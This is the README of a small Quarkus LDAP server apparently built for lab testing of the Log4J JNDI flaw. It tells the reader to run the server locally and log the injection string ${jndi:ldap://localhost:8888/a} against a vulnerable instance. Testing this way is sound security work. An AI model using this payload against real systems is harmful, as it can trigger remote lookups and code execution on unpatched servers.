# SlyServer

This project uses Quarkus to run a simple LDAP server for hacking purposes

It's designed to be used in dev mode 

Start with 

```shell script
quarkus dev
```

Then point your vulnerable Log4J instance at it.  

Asuming default configuration  try logging 

${jndi:ldap://localhost:8888/a}  and see what turns up in this servers log and the vulnerable one.



